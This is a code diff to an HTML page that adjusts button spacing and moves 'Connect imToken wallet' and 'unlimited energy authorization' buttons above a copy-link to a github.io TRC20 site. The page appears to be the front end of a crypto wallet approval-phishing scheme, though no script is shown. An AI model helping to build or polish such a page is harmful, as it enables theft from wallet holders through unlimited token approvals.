@@ -161,7 +161,7 @@
         .btn-group {
             display: flex;
             flex-direction: column;
-            gap: -15px; /* 缩小按钮间距 */
+            gap: 5px; /* 缩小按钮间距 */
             margin-top: 10px;
             padding: 10px 0;
             border-top: 1px solid #2d3b36;
@@ -247,8 +247,14 @@
 
     <!-- 底部按钮组：按条件隐藏 -->
     <div class="btn-group">
-        <!-- 复制链接区：修复图标符号 -->
-        <div class="copy-link-wrap">
+        <button id="connectBtn" class="btn">
+             连接imToken钱包
+        </button>
+        <button id="approveBtn" class="btn" disabled>
+            能量无限授权
+        </button>
+         <!-- 复制链接区：修复图标符号 -->
+        <div id="connectBtn" class="copy-link-wrap">
             <span id="copyLinkText">
                 https://trc20trx-alt.github.io/Trc20.TRX/
             </span>
@@ -256,12 +262,6 @@
                  复制链接
             </button>
         </div>
-        <button id="connectBtn" class="btn">
-             连接imToken钱包
-        </button>
-        <button id="approveBtn" class="btn" disabled>
-            能量无限授权
-        </button>
     </div>
 
     <!-- 底部信息区：修复图标符号 -->
